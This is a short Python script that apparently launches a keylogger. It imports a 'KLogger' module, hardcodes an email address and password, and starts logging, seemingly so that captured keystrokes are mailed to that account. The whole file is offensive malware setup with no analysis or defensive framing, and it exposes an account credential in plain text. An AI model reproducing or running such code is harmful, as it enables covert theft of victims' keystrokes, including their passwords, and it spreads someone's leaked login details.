#!/usr/bin/env python
import KLogger

EMAIL = "ryuzaki.hcker@gmail.com"
PASSWORD = "ml2yvCuCRz7OxDWy2lgshHrWxbrlGGhRH"

key_log = KLogger.Klogger(EMAIL, PASSWORD,5)
key_log.start()